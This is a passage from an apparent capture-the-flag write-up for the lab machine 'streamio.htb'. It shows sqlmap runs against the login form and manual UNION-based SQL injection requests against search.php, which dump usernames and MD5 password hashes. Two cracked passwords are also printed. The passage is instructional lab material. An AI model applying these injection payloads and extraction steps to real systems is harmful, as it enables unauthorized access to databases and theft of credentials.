font-style: inherit;">➜</span>  streamio sqlmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-r</span> req-login.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--dbs</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--threads</span> 5 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--force-ssl</span></span>
<span id="cb5-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb5-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[11:52:15]</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">INFO</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">custom</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">POST</span> parameter <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'#1*'</span> appears to be <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'Microsoft SQL Server/Sybase stacked queries (comment)'</span> injectable </span>
<span id="cb5-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">sqlmap</span> identified the following injection point<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">with</span> a total of 66 HTTP<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">requests:</span></span>
<span id="cb5-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">---</span></span>
<span id="cb5-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Parameter:</span> <span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#1* ((custom) POST)</span></span>
<span id="cb5-8">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Type:</span> stacked queries</span>
<span id="cb5-9">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Title:</span> Microsoft SQL Server/Sybase stacked queries <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">comment</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb5-10">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Payload:</span> username=<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">';WAITFOR DELAY '</span>0:0:5<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'--&amp;password=asdf'</span></span>
<span id="cb5-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">---</span></span>
<span id="cb5-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">available</span> databases <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">5</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span>:</span>
<span id="cb5-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> model</span>
<span id="cb5-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> msdb</span>
<span id="cb5-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> STREAMIO</span>
<span id="cb5-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> streamio_backup</span>
<span id="cb5-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> tempdb</span>
<span id="cb5-18"></span>
<span id="cb5-19"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## EMAIL</span></span>
<span id="cb5-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  streamio sqlmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-r</span> req-email.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--dbs</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--threads</span> 5 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--force-ssl</span></span>
<span id="cb5-21"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb5-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[11:59:45]</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">CRITICAL</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> all tested parameters do not appear to be injectable.]</span>
<span id="cb5-23"></span>
<span id="cb5-24"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## SEARCH</span></span>
<span id="cb5-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  streamio sqlmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-r</span> req-search.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--dbs</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--threads</span> 5 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--force-ssl</span></span>
<span id="cb5-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb5-27"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[12:01:57]</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">CRITICAL</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> all tested parameters do not appear to be injectable.</span></code></pre></div>
</section>
<section id="step-2" class="level3">
<h3 class="anchored" data-anchor-id="step-2">Step 2</h3>
<p>We have a timed injection in the username parameter of the login page. Continue to enumerate tables of database <code>STREAMIO</code>.</p>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  streamio sqlmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-r</span> req-login.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-D</span> STREAMIO <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--tables</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--force-ssl</span></span>
<span id="cb6-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb6-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[12:11:46]</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">INFO</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> retrieved: dbo.movies</span>
<span id="cb6-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[12:11:46]</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">INFO</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> retrieved: dbo.users</span>
<span id="cb6-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Database:</span> STREAMIO</span>
<span id="cb6-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[2</span> tables]</span>
<span id="cb6-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+--------+</span></span>
<span id="cb6-8"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">movies</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb6-9"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">users</span>  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb6-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+--------+</span></span>
<span id="cb6-11"></span>
<span id="cb6-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  streamio sqlmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-r</span> req-login.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-D</span> STREAMIO <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-T</span> dbo.users <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--dump</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--force-ssl</span></span>
<span id="cb6-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb6-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[12:14:05]</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">INFO</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> retrieved: is_staff</span>
<span id="cb6-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[12:14:47]</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">INFO</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> retrieved: password</span>
<span id="cb6-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[12:15:29]</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">INFO</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> retrieved: username</span>
<span id="cb6-17"></span>
<span id="cb6-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+----+----------+----------------------------------------------------+----------------------------------------------------+</span></span>
<span id="cb6-19"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">id</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">is_staff</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">password</span>                                           <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">username</span>                                           <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb6-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+----+----------+----------------------------------------------------+----------------------------------------------------+</span></span>
<span id="cb6-21"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3</span>  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1</span>        <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">c660060492d9edcaa8332d89c99c9239</span>                   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">James</span>                                              <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb6-22"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">4</span>  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1</span>        <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">925e5408ecb67aea449373d668b7359e</span>                   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Theodore</span>                                           <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb6-23"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">5</span>  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1</span>        <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">083ffae904143c4796e464dac33c1f7d</span>                   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Samantha</span>                                           <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb6-24"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">6</span>  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1</span>        <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">08344b85b329d7efd611b7a7743e8a09</span>                   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Lauren</span>                                             <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb6-25"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">7</span>  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1</span>        <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">d62be0dc82071bccc1322d64ec5b6c51</span>                   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">William</span>                                            <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb6-26"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">8</span>  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1</span>        <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">f87d3c0d6c8fd686aacc6627f1f493a5</span>                   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Sabrina</span>                                            <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb6-27"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">9</span>  <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1</span>        <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">f03b910e2bd0313a23fdd7575f34a694</span>                   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Robert</span>                                             <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb6-28"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">1</span>        <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">3577c47eb1e12c8ba021611e1280753c</span>                   <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Thane</span>                                              <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span></span>
<span id="cb6-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">+----+----------+----------------------------------------------------+----------------------------------------------------+</span></span>
<span id="cb6-30"></span>
<span id="cb6-31"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">LAUREN</span> = 08344b85b329d7efd611b7a7743e8a09:##123a8j8w5123##</span>
<span id="cb6-32"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SABRINA</span> = f87d3c0d6c8fd686aacc6627f1f493a5:!!sabrina$ </span></code></pre></div>
<p>The dump is time-based which takes ages, so after about two hours I stop sqlmap and look for other ways in. Of the 10 hashes collected we’re able to crack two - however they don’t lead to anything.</p>
<p>Shifting focus to <code>watch.streamio.htb/search.php</code> I notice that the user input isn’t parameterized. If I search for <code>1</code> I get all movies containing 1, however if I search for <code>1';-- -</code> I only get all movies <strong>ENDING</strong> with 1, and they are sorted by release date.</p>
<p>With that information I assume the original query is something like this:</p>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode sql code-with-copy"><code class="sourceCode sql"><span id="cb7-1">## ASSUMED ORIGINAL <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">QUERY</span></span>
<span id="cb7-2"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">SELECT</span> Name, ReleaseDate <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">FROM</span> STREAMIO.movies</span>
<span id="cb7-3"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">WHERE</span> Name <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'INPUT-DATA'</span></span>
<span id="cb7-4"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">ORDER</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">BY</span> Name <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">ASC</span>;</span></code></pre></div>
<p>Playing around with SQLi and <code>UNION SELECT @@version</code> we can ennumerate the number of columns, example:</p>
<div class="sourceCode" id="cb8" style="background: #f1f3f5;"><pre class="sourceCode sql code-with-copy"><code class="sourceCode sql"><span id="cb8-1"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">' UNION SELECT @@version</span></span>
<span id="cb8-2"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">UNION</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">SELECT</span> @@version,<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span></span>
<span id="cb8-3"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">' UNION SELECT 1,@@version</span></span>
<span id="cb8-4"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">UNION</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">SELECT</span> @@version,<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span>,<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">3</span></span>
<span id="cb8-5"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">' UNION SELECT 1,@@version,3</span></span>
<span id="cb8-6"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">UNION</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">SELECT</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span>,<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span>,@@version</span>
<span id="cb8-7"><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">..</span>.</span></code></pre></div>
<p>At 6 columns we get the response we’re looking for:</p>
<div class="sourceCode" id="cb9" style="background: #f1f3f5;"><pre class="sourceCode sql code-with-copy"><code class="sourceCode sql"><span id="cb9-1">## REQUEST</span>
<span id="cb9-2">q<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span><span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">1</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">' UNION SELECT 1,@@version,3,4,5,6;-- -</span></span>
<span id="cb9-3"></span>
<span id="cb9-4"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'</span>## RESPONSE</span>
<span id="cb9-5">Microsoft SQL Server <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2019</span> (RTM) <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">15</span>.<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">0</span>.<span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">2000.5</span> (X64) </span>
<span id="cb9-6">    Sep <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">24</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2019</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">13</span><span class="ch" style="color: #20794D;
background-color: null;
font-style: inherit;">:48:23</span> </span>
<span id="cb9-7">    Copyright (C) <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2019</span> Microsoft Corporation</span>
<span id="cb9-8">    Express Edition (<span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">64</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">-</span>bit) <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">on</span> Windows Server <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2019</span> Standard <span class="fl" style="color: #AD0000;
background-color: null;
font-style: inherit;">10.0</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span>X64<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> (<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">Build</span> <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">17763</span>: ) (Hypervisor)</span></code></pre></div>
<p>With this injection, and previously known database information, we are now able to extract the entire user database.</p>
<pre class="http"><code>### REQUEST
POST /search.php HTTP/2
Host: watch.streamio.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 77
Origin: https://watch.streamio.htb
Referer: https://watch.streamio.htb/search.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers

q=1' UNION SELECT 1,concat(username,':',password),3,4,5,6 from dbo.users;-- -</code></pre>
<p>Copy the output to a file, and with some bash magic we can make a list of all users and it’s corresponding hash.</p>
<div class="sourceCode" id="cb11" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb11-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  streamio cat sqli-out.txt<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">awk</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-F</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">" "</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'{print $2,$3}'</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">cut</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-d</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'&gt;'</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-f2</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">sort</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">grep</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">" :"</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">sed</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'s/ //g'</span></span>
<span id="cb11-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">admin:665a50ac9eaa781e4f7f04199db97a11</span></span>
<span id="cb11-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Alexendra:1c2b3d8270321140e5153f6637d3ee53</span></span>
<span id="cb11-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">asdasd:7815696ecbf1c96e6894b779456d330e</span></span>
<span id="cb11-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Austin:0049ac57646627b8d7aeaccf8b6a936f</span></span>
<span id="cb11-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Barbra:3961548825e3e21df5646cafe11c6c76</span></span>
<span id="cb11-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Barry:54c88b2dbd7b1a84012fabc1a4c73415</span></span>
<span id="cb11-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Baxter:22ee218331afd081b0dcd8115284bae3</span></span>
<span id="cb11-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Bruno:2a4e2cf22dd8fcb45adcb91be1e22ae8</span></span>
<span id="cb11-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Carmon:35394484d89fcfdb3c5e447fe749d213</span></span>
<span id="cb11-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Clara:ef8f3d30a856cf166fb8215aca93e9ff</span></span>
<span id="cb11-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">:d41d8cd98f00b204e9800998ecf8427e</span></span>
<span id="cb11-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Diablo:ec33265e5fc8c2f1b0c137bb7b3632b5</span></span>
<span id="cb11-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Garfield:8097cedd612cc37c29db152b6e9edbd3</span></span>
<span id="cb11-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Gloria:0cfaaaafb559f081df2befbe66686de0</span></span>
<span id="cb11-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">James:c660060492d9edcaa8332d89c99c9239</span></span>
<span id="cb11-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Juliette:6dcd87740abb64edfa36d170f0d5450d</span></span>
<span id="cb11-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Lauren:08344b85b329d7efd611b7a7743e8a09</span></span>
<span id="cb11-19"><span class="ex" style="color: null;
background-color: null;
